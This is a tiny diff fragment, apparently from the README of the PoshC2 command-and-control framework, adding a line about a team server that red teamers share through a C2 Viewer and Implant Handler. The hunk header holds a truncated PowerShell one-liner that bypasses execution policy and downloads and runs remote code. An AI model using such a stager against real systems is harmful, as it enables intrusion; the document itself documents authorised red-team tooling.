@@ -11,4 +11,4 @@ powershell -exec bypass -c "IEX (New-Object System.Net.WebClient).DownloadString
 
 # Team Server
 
-
+Create one PoshC2 team server and allow multiple red teamers to connect using the C2 Viewer and Implant Handler
